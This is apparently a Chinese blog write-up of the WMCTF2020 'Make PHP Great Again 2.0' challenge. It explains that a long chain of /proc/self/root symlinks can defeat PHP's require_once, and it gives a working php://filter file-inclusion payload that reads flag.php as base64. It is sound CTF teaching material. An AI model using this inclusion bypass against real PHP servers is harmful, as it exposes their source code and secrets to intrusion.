---
title: '[WMCTF2020]Make PHP Great Again 2.0'
date: 2024-09-09 19:05:45
tags: php特性
categories: 刷题笔记
---

### [WMCTF2020]Make PHP Great Again 2.0

`require_once` 表达式和 [require](https://www.php.net/manual/zh/function.require.php) 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。

由于 require_once 包含的软链接层数较多时 once 的 hash 匹配会直接失效造成重复包含。

<!--more-->

由于已经包含过一次了，接下来就是绕过once再包含一次

`/proc/self/`是指向当前进程的`/proc/pid/`，而`/proc/self/root`是指向`/`的软连接，所以让软连接层数变多即可造成重复包含：

```
?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

![image-20240909191021406](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409091910499.png)

解码base64得到flag
